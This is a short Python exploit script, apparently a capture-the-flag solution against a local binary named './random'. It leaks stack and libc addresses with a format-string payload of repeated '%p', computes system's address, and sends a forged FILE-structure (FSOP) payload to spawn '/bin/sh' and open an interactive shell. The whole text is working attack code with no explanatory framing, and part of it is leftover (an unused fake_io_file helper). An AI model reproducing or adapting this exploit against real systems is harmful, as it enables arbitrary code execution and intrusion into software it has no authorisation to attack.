#!/usr/bin/env python 
from mypwn import *
import re
p=process('./random')
context(log_level="debug",os='linux',arch='amd64')


def myopen():
    p.sendline('1')

def myclose():
    p.sendline('3')

def myread():
    p.sendline('2')

myopen()
sleep(0.1)
myclose()
sleep(0.1)
myread()
p.sendline('%p'*499)
gdb.attach(p,'nb c4d')
line=p.recvuntil('all').strip('all')
line=re.split(r'(0x|\(nil\))',line)
# for i in range(len(line)):
#     if line[i]=="0x" or line[i]=='(nil)' or line[i]=='':
#         continue
#     elif(0x00007ffff7a0d000<=int(line[i],16)<=0x00007ffff7dd3000):
#         print("libc[{}]: {}".format(i,line[i]))
#     elif(0x00007ffffffde000<int(line[i],16)<0x00007ffffffff000):
#         print("stack[{}]: {}".format(i,line[i]))
stack_addr=int(line[806],16)
libc_addr=int(line[812],16)
libc_base=libc_addr-0x20830

libc=p.libc
libc.address=libc_base
system=libc.symbols['system']
store=stack_addr-0xd50
print(hex(stack_addr))
print(hex(store))

def fake_io_file():
    ret_string='/bin/sh\x00'
    ret_string=ret_string.ljust(0x40,'\x00')
    ret_string+=p64(system)
    ret_string=ret_string.ljust(0x88,'\x00')
    ret_string+=p64(store+0x10)
    ret_string=ret_string.ljust(0xd8,'\x00')
    ret_string+=p64(store)
    return 'aaa'+ret_string

ret_string=fsop_payload(store,{'read':system})
p.sendline('1')
sleep(0.1)
p.sendline('aaa'+ret_string)

p.interactive()